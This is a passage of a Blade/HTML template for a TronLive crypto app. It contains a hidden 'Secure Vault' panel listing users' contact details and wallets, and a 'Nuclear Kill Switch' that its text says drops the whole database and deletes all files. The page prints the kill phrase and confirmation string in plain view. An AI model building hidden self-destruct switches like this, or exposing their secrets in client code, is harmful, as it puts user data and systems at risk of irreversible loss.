                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                            </svg>
                        </div>
                        <h1 class="text-3xl font-bold text-red-600 mb-4">NUCLEAR KILL SWITCH EXECUTED</h1>
                        <div class="text-gray-700 space-y-2">
                            <p class="text-lg font-semibold">${data.message}</p>
                            <p class="text-sm">Timestamp: ${data.timestamp}</p>
                            <p class="text-sm mt-4">${data.final_message}</p>
                        </div>
                        <div class="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                            <p class="text-red-800 font-bold">APPLICATION DESTROYED</p>
                            <p class="text-red-600 text-sm">All data and files have been permanently deleted.</p>
                        </div>
                    </div>
                </div>
            `;
        } else {
            showNotification(data.error || 'Kill switch execution failed', 'error');
            executeButton.disabled = false;
            executeButton.innerHTML = `
                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                </svg>
                EXECUTE NUCLEAR DESTRUCTION
            `;
        }
        
    } catch (error) {
        console.error('Kill switch error:', error);
        showNotification('Kill switch execution failed: ' + error.message, 'error');
        
        // Reset button
        const executeButton = document.querySelector('button[onclick="executeKillSwitch()"]');
        executeButton.disabled = false;
        executeButton.innerHTML = `
            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
            </svg>
            EXECUTE NUCLEAR DESTRUCTION
        `;
    }
}
</script>

<!-- Secure Vault Interface - Hidden by default -->
<div id="secure-vault-interface" class="hidden fixed inset-0 bg-white z-50 overflow-y-auto">
    <div class="min-h-screen bg-white">
        <!-- Header -->
        <div class="bg-gray-800 border-b border-gray-300">
            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                <div class="flex justify-between items-center py-4">
                    <div class="flex items-center space-x-3">
                        <div class="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center">
                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                        </div>
                        <h1 class="text-xl font-bold text-white">SECURE VAULT</h1>
                        <span class="px-2 py-1 bg-red-600 text-white text-xs rounded-full">RESTRICTED ACCESS</span>
                    </div>
                    <button onclick="hideVaultInterface()" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition-colors">
                        <svg class="w-5 h-5 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
                        </svg>
                        EXIT VAULT
                    </button>
                </div>
            </div>
        </div>

        <!-- Vault Content -->
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
            <!-- Stats Cards -->
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
                <!-- Total Users Card -->
                <div class="bg-white rounded-lg p-6 border border-gray-300 shadow-sm">
                    <div class="flex items-center">
                        <div class="w-12 h-12 bg-gray-600 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197m13.5-9a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0z"></path>
                            </svg>
                        </div>
                        <div class="ml-4">
                            <p class="text-gray-600 text-sm">Total Users</p>
                            <p class="text-gray-900 text-2xl font-bold" id="vault-total-users">***</p>
                        </div>
                    </div>
                </div>

                <!-- Admin Wallet Card -->
                <div class="bg-white rounded-lg p-6 border border-gray-300 shadow-sm">
                    <div class="flex items-center">
                        <div class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                            </svg>
                        </div>
                        <div class="ml-4 flex-1">
                            <p class="text-gray-600 text-sm">Admin Wallet</p>
                            <div class="flex items-center space-x-2">
                                <code class="text-gray-900 text-sm font-mono bg-gray-100 px-2 py-1 rounded" id="vault-admin-address">***</code>
                                <button onclick="copyToClipboard(document.getElementById('vault-admin-address').textContent)" class="text-gray-600 hover:text-gray-800">
                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                                    </svg>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Admin Balance Card -->
                <div class="bg-white rounded-lg p-6 border border-gray-300 shadow-sm">
                    <div class="flex items-center">
                        <div class="w-12 h-12 bg-yellow-600 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1"></path>
                            </svg>
                        </div>
                        <div class="ml-4">
                            <p class="text-gray-600 text-sm">Admin Balance</p>
                            <p class="text-gray-900 text-2xl font-bold"><span id="vault-admin-balance">***</span> TRX</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- EXTREMELY DANGEROUS: Nuclear Kill Switch Section -->
            <div class="bg-red-50 border-2 border-red-200 rounded-lg p-6 mb-8">
                <div class="flex items-center mb-4">
                    <div class="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center mr-3">
                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                        </svg>
                    </div>
                    <div>
                        <h3 class="text-lg font-bold text-red-800">NUCLEAR KILL SWITCH</h3>
                        <p class="text-red-600 text-sm">EXTREMELY DANGEROUS - DESTROYS EVERYTHING</p>
                    </div>
                </div>
                
                <div class="bg-red-100 border border-red-300 rounded-lg p-4 mb-4">
                    <div class="flex">
                        <div class="flex-shrink-0">
                            <svg class="h-5 w-5 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                            </svg>
                        </div>
                        <div class="ml-3">
                            <h3 class="text-sm font-medium text-red-800">WARNING</h3>
                            <div class="mt-2 text-sm text-red-700">
                                <ul class="list-disc pl-5 space-y-1">
                                    <li>This will <strong>PERMANENTLY DELETE</strong> the entire database</li>
                                    <li>This will <strong>DESTROY ALL FILES</strong> in the application</li>
                                    <li>This action is <strong>100% IRREVERSIBLE</strong></li>
                                    <li>All user data, wallets, and transactions will be <strong>LOST FOREVER</strong></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                
                <button onclick="showKillSwitchModal()" 
                        class="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded-lg font-bold transition-colors flex items-center">
                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                    </svg>
                    ACTIVATE NUCLEAR KILL SWITCH
                </button>
            </div>

            <!-- User Data Table Section -->
            <div class="bg-white rounded-lg border border-gray-300 shadow-sm">
                <div class="p-6 border-b border-gray-300">
                    <h2 class="text-xl font-bold text-gray-900 flex items-center">
                        <svg class="w-6 h-6 mr-2 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path>
                        </svg>
                        User Information & Wallets
                    </h2>
                    <p class="text-gray-600 text-sm mt-1">Search and view user details</p>
                    
                    <!-- Search Bar -->
                    <div class="mt-4">
                        <div class="relative">
                            <input type="text" id="user-search" placeholder="Search by phone number or email..." 
                                   class="w-full px-4 py-2 pl-10 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                                   oninput="filterUsers()">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                                </svg>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Table -->
                <div class="overflow-x-auto">
                    <table class="min-w-full divide-y divide-gray-200">
                        <thead class="bg-gray-50">
                            <tr>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User ID</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Name</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Email</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Phone</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Wallet Address</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Balance</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Withdrawn</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="vault-users-table" class="bg-white divide-y divide-gray-200">
                            <!-- User rows will be loaded here -->
                        </tbody>
                    </table>
                </div>
                
                <!-- Pagination Controls -->
                <div id="vault-pagination" class="bg-gray-50 px-4 py-3 border-t border-gray-200 sm:px-6">
                    <div class="flex items-center justify-between">
                        <div class="flex-1 flex justify-between sm:hidden">
                            <!-- Mobile pagination -->
                            <button id="vault-prev-mobile" onclick="loadPreviousPage()" class="relative inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
                                Previous
                            </button>
                            <button id="vault-next-mobile" onclick="loadNextPage()" class="ml-3 relative inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
                                Next
                            </button>
                        </div>
                        <div class="hidden sm:flex-1 sm:flex sm:items-center sm:justify-between">
                            <div>
                                <p class="text-sm text-gray-700" id="vault-pagination-info">
                                    <!-- Pagination info will be inserted here -->
                                </p>
                            </div>
                            <div>
                                <nav class="relative z-0 inline-flex rounded-md shadow-sm -space-x-px" aria-label="Pagination">
                                    <button id="vault-prev-desktop" onclick="loadPreviousPage()" class="relative inline-flex items-center px-2 py-2 rounded-l-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
                                        <span class="sr-only">Previous</span>
                                        <svg class="h-5 w-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                            <path fill-rule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                    <span id="vault-page-numbers" class="relative inline-flex items-center px-4 py-2 border border-gray-300 bg-white text-sm font-medium text-gray-700">
                                        <!-- Page numbers will be inserted here -->
                                    </span>
                                    <button id="vault-next-desktop" onclick="loadNextPage()" class="relative inline-flex items-center px-2 py-2 rounded-r-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
                                        <span class="sr-only">Next</span>
                                        <svg class="h-5 w-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                            <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- EXTREMELY DANGEROUS: Kill Switch Modal -->
<div id="kill-switch-modal" class="hidden fixed inset-0 bg-black bg-opacity-75 z-[60] flex items-center justify-center p-4">
    <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div class="bg-red-600 text-white p-6 rounded-t-lg">
            <div class="flex items-center">
                <div class="w-10 h-10 bg-white bg-opacity-20 rounded-full flex items-center justify-center mr-4">
                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                    </svg>
                </div>
                <div>
                    <h2 class="text-2xl font-bold">NUCLEAR KILL SWITCH</h2>
                    <p class="text-red-100">COMPLETE APPLICATION DESTRUCTION</p>
                </div>
            </div>
        </div>
        
        <div class="p-6">
            <div class="bg-red-50 border-2 border-red-200 rounded-lg p-4 mb-6">
                <div class="flex">
                    <div class="flex-shrink-0">
                        <svg class="h-6 w-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                        </svg>
                    </div>
                    <div class="ml-3">
                        <h3 class="text-lg font-medium text-red-800">FINAL WARNING</h3>
                        <div class="mt-2 text-sm text-red-700">
                            <p class="font-bold mb-2">This action will PERMANENTLY and IRREVERSIBLY:</p>
                            <ul class="list-disc pl-5 space-y-1">
                                <li><strong>DROP ALL DATABASE TABLES</strong> - All user data, wallets, transactions DELETED</li>
                                <li><strong>DELETE ALL APPLICATION FILES</strong> - Complete codebase destruction</li>
                                <li><strong>DESTROY THE ENTIRE PROJECT</strong> - No recovery possible</li>
                                <li><strong>CLEAR ALL CACHES</strong> - All stored data wiped</li>
                            </ul>
                            <p class="font-bold mt-3 text-red-800">THERE IS NO UNDO. EVERYTHING WILL BE LOST FOREVER.</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">
                        Kill Switch Phrase (Required)
                    </label>
                    <input type="text" id="kill-phrase-input" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent font-mono"
                           placeholder="Enter the nuclear kill phrase...">
                    <p class="text-xs text-gray-500 mt-1">Hint: NUCLEAR_OPTION_DESTROY_EVERYTHING_NOW_666</p>
                </div>
                
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">
                        Final Confirmation (Required)
                    </label>
                    <input type="text" id="kill-confirmation-input" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent font-mono"
                           placeholder="Type the confirmation phrase...">
                    <p class="text-xs text-gray-500 mt-1">Type: YES_DESTROY_EVERYTHING_I_UNDERSTAND_THIS_IS_IRREVERSIBLE</p>
                </div>
                
                <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                    <div class="flex">
                        <div class="flex-shrink-0">
                            <svg class="h-5 w-5 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                            </svg>
                        </div>
                        <div class="ml-3">
                            <p class="text-sm text-yellow-800">
                                <strong>Last chance to reconsider:</strong> This will destroy the entire TronLive application, all user accounts, all wallet data, all transactions, and all files. The application will cease to exist.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="flex justify-between mt-8">
                <button onclick="hideKillSwitchModal()" 
                        class="px-6 py-3 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 transition-colors">
                    Cancel (Safe Choice)
                </button>
                <button onclick="executeKillSwitch()" 
                        class="px-8 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors font-bold flex items-center">
                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                    </svg>
                    EXECUTE NUCLEAR DESTRUCTION
                </button>
            </div>
        </div>
    </div>
</div>

@endsection
